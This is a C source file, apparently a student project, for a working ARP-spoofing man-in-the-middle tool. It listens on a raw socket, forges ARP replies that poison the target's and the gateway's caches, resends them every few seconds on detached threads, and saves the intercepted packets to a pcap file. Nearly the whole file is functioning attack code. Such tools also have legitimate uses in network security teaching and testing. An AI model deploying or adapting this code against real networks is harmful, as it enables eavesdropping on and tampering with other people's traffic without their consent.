#include "malcolm.h"

// INFO : Why just use one Global variable? -> Do cleanup resource in signal handler
struct mitm data;

// Optimized: Buffer pool definitions
struct thread_arg thread_arg_pool[THREAD_ARG_POOL_SIZE];
unsigned char buffer_pool[THREAD_ARG_POOL_SIZE][BUFFER_SIZE];
bool pool_used[THREAD_ARG_POOL_SIZE] = {false};

// Optimized: Get a thread argument from the pool to reduce malloc/free
struct thread_arg *get_thread_arg_from_pool(void)
{
  for (int i = 0; i < THREAD_ARG_POOL_SIZE; i++)
  {
    if (!pool_used[i])
    {
      pool_used[i] = true;
      thread_arg_pool[i].buffer = buffer_pool[i];
      return &thread_arg_pool[i];
    }
  }
  // Fallback to malloc if pool is exhausted
  struct thread_arg *arg = malloc(sizeof(struct thread_arg));
  arg->buffer = malloc(BUFFER_SIZE);
  return arg;
}

void return_thread_arg_to_pool(struct thread_arg *arg)
{
  // Check if this is from our pool
  for (int i = 0; i < THREAD_ARG_POOL_SIZE; i++)
  {
    if (arg == &thread_arg_pool[i])
    {
      pool_used[i] = false;
      return;
    }
  }
  // This was malloc'd, so free it
  if (arg->buffer)
    free(arg->buffer);
  free(arg);
}

static inline unsigned char hex_to_byte(char c)
{
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return 0xFF; // Invalid
}

bool convert_mac(const char *src_mac, unsigned char *dest_mac)
{
  const char *p = src_mac;
  
  // Fast length check - MAC should be exactly 17 chars (xx:xx:xx:xx:xx:xx)
  if (ft_strlen(src_mac) != 17)
    return (false);
    
  // Parse 6 bytes directly
  for (int i = 0; i < 6; i++)
  {
    unsigned char high = hex_to_byte(*p++);
    unsigned char low = hex_to_byte(*p++);
    
    if (high == 0xFF || low == 0xFF)
      return (false);
      
    dest_mac[i] = (high << 4) | low;
    
    // Skip colon (except after last byte)
    if (i < 5)
    {
      if (*p++ != ':')
        return (false);
    }
  }
  return (true);
}

int check_protocol(const char *ip, struct in_addr *ipv4, struct in6_addr *ipv6)
{
  if (inet_pton(AF_INET, ip, ipv4) > 0)
    return IPV4; // IPv4
  else if (inet_pton(AF_INET6, ip, ipv6) > 0)
    return IPV6; // IPv6
  else
    ft_assert(0, "Invalid IP address: %s", ip);
  return -1;     // Unreachable, just to silence warnings
}

void args_check(char *argv[], struct mitm *data)
{
  const IP_TYPE source_protocol = check_protocol(argv[1], &data->source_ipv4, &data->source_ipv6);
  const IP_TYPE target_protocol = check_protocol(argv[3], &data->target_ipv4, &data->target_ipv6);

  ft_assert(convert_mac(argv[2], data->source_mac) == true, "%s : invalid mac address(%s)", argv[0], argv[2]);
  ft_assert(convert_mac(argv[4], data->target_mac) == true, "%s : invalid mac address(%s)", argv[0], argv[4]);
  ft_assert(source_protocol == target_protocol, "Source and Target protocols do not match");
  ft_assert(source_protocol == IPV4, "Protocol is not IPV4");
  data->ip_type = source_protocol;
  if (DEBUG)
  {
    print_mac("Sender Address : ", data->source_mac, "\n");
    print_mac("Target Address : ", data->target_mac, "\n");
    if (data->ip_type == IPV4)
    {
      print_ipv4("Sender IP : ", (unsigned char *)&data->source_ipv4, "\n");
      print_ipv4("Target IP : ", (unsigned char *)&data->target_ipv4, "\n");
    }
  }
}

void make_arp_packet(unsigned char *buffer)
{
  struct ethhdr     *cur_eth = (struct ethhdr *)buffer;
  struct arp_packet *cur_arp = (struct arp_packet *)(buffer + sizeof(struct ethhdr));

  ft_memcpy(cur_eth->h_dest, data.target_mac, sizeof(data.target_mac));
  ft_memcpy(cur_eth->h_source, data.source_mac, sizeof(data.source_mac));
  ft_memcpy(cur_arp->target_ip, &data.target_ipv4, sizeof(data.target_ipv4));
  ft_memcpy(cur_arp->target_mac, data.target_mac, sizeof(data.target_mac));
  ft_memcpy(cur_arp->sender_ip, &data.source_ipv4, sizeof(data.source_ipv4));
  ft_memcpy(cur_arp->sender_mac, data.source_mac, sizeof(data.source_mac));
  cur_arp->hdr.ar_hrd = htons(1);            // Ethernet (1)
  cur_arp->hdr.ar_pro = htons(ETHERTYPE_IP); // IPv4 (0x0800)
  cur_arp->hdr.ar_hln = 6;                   // MAC 주소 길이 (6 바이트)
  cur_arp->hdr.ar_pln = 4;                   // IPv4 주소 길이 (4 바이트)
  cur_arp->hdr.ar_op  = htons(ARPOP_REPLY);  // ARP 응답 (2)
}

void *send_fake_arp_reply(void *arg)
{
  struct sockaddr_ll dest_addr;
  struct thread_arg *t_arg = arg;

  ft_memset(&dest_addr, 0, sizeof(dest_addr));
  dest_addr.sll_family   = AF_PACKET;
  dest_addr.sll_protocol = htons(t_arg->protocol);
  dest_addr.sll_ifindex  = data.if_index;
  dest_addr.sll_halen    = ETH_ALEN;
  ft_memcpy(dest_addr.sll_addr, t_arg->mac, ETH_ALEN);
  
  while (true)
  {
    if (sendto(data.sockfd, t_arg->buffer, t_arg->buflen, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) <= 0)
    {
      perror("sendto failed");
      break;
    }
    if (DEBUG)
      printf("send okay!!\n");
    sleep(SPOOF_INTERVAL_SEC); // Optimized: use configurable interval
  }
  
  // Optimized: Use pool for cleanup
  return_thread_arg_to_pool(t_arg);
  return (NULL);
}

void send_reply_packet(unsigned char *buffer, int buflen, __be16 protocol)
{
  pthread_t          tid;
  struct thread_arg *arg;

  // Optimized: Use pool instead of malloc
  arg = get_thread_arg_from_pool();
  ft_memcpy(arg->buffer, buffer, buflen);
  ft_memcpy(arg->mac, data.target_mac, MAC_ADDR_LEN);
  arg->buflen   = buflen;
  arg->protocol = protocol;
  
  if (pthread_create(&tid, NULL, send_fake_arp_reply, (void *)arg) != 0)
  {
    perror("pthread_create failed");
    return_thread_arg_to_pool(arg);
    exit(EXIT_FAILURE);
  }
  if (pthread_detach(tid) != 0)
  {
    perror("pthread_detach failed");
    exit(EXIT_FAILURE);
  }
}

void check_packet(unsigned char *buffer, int buflen)
{
  struct ethhdr     *eth    = (struct ethhdr *)buffer;
  struct arp_packet *packet = (struct arp_packet *)(buffer + sizeof(struct ethhdr));

  // Optimized: Early exit if not ARP
  if (ntohs(eth->h_proto) != ETH_P_ARP)
    return;

  // Optimized: Check target->source communication first (more common case)
  if (ft_memcmp(packet->sender_ip, &data.target_ipv4, sizeof(data.target_ipv4)) == 0 &&
      ft_memcmp(packet->sender_mac, data.target_mac, sizeof(data.target_mac)) == 0 &&
      ft_memcmp(packet->target_ip, &data.source_ipv4, sizeof(data.source_ipv4)) == 0)
  {
    if (DEBUG)
    {
      printf("prev_packet!!\n");
      print_arp_packet(buffer);
    }
    make_arp_packet(buffer);
    if (DEBUG)
    {
      printf("new_packet!!\n");
      print_arp_packet(buffer);
    }
    send_reply_packet(buffer, buflen, ETH_P_ARP);
    send_gateway_arp_request_packet(buffer, buflen);
    return;
  }
  
  // Optimized: Check gateway communication
  if (ft_memcmp(packet->sender_ip, &data.gw_ipv4, sizeof(data.gw_ipv4)) == 0)
  {
    ft_memcpy(data.gw_mac, packet->sender_mac, MAC_ADDR_LEN);
    send_gateway_spoofing_packet(buffer, buflen);
    data.spoofing     = true;
    data.pcap_file_fd = init_pcap_file("test.pcap");
  }
}

void wait_arp_req()
{
  unsigned char buffer[IP_MAXPACKET] = { 0 };
  int           saddr_len, buflen;
  struct ethhdr *eth;

  saddr_len = sizeof(data.saddr);
  while (true)
  {
    buflen = recvfrom(data.sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&data.saddr, (socklen_t *)&saddr_len);
    ft_assert(buflen >= 0, "error in reading recvfrom function");
    
    // Optimized: Early size check
    if (buflen < (int)sizeof(struct ethhdr))
      continue;
      
    eth = (struct ethhdr *)buffer;
    
    if (data.spoofing)
    {
      // Optimized: Direct comparison without function call overhead
      if (ft_memcmp(eth->h_dest, data.target_mac, MAC_ADDR_LEN) == 0)
      {
        if (DEBUG)
        {
          print_mac("\t|Ether Sender Address	: ", eth->h_source, "\n");
          print_mac("\t|Ether Destination Address	: ", eth->h_dest, "\n");
          printf("\tEther_prot = %d\n", eth->h_proto);
        }
        save_packet_to_pcap(data.pcap_file_fd, buffer, buflen);
      }
    }
    else
      check_packet(buffer, buflen);
  }
}

void make_socket()
{
  data.sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  ft_assert(data.sockfd > 0, "error in socket!");
  if (setsockopt(data.sockfd, SOL_SOCKET, SO_BINDTODEVICE, data.if_name, ft_strlen(data.if_name)) < 0)
  {
    close(data.sockfd);
    perror("setsockopt(SO_BINDTODEVICE)");
    exit(EXIT_FAILURE);
  }
}

int main(int argc, char *argv[])
{
  ft_assert(argc == 5, "usage : %s source_ip source_mac target_ip target_mac", argv[0]);
  signal(SIGINT, cleanup_handler);
  args_check(argv, &data);
  select_interface();
  make_socket();
  wait_arp_req();
  return (EXIT_SUCCESS);
}
